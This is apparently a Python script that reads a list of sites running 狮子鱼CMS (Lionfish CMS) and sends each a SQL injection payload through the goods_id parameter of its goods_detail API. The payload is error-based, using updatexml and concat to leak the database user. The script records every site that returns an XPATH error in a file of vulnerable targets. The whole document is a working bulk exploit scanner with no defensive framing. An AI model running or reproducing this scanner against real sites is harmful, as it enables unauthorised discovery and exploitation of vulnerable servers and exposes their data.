import requests


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("狮子鱼CMS.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.get(url+"/index.php?s=api/goods_detail&amp;goods_id=1 and updatexml(1,concat(0x7e,user(),0x7e),1)", headers=headers, verify=False, timeout=5)
        if ("XPATH syntax error" in jiaoyan.text):
            with open("狮子鱼CMS good_id参数 sql注入 vul.txt", "a+") as f:
                f.write(url+"\n")
    except:
        continue

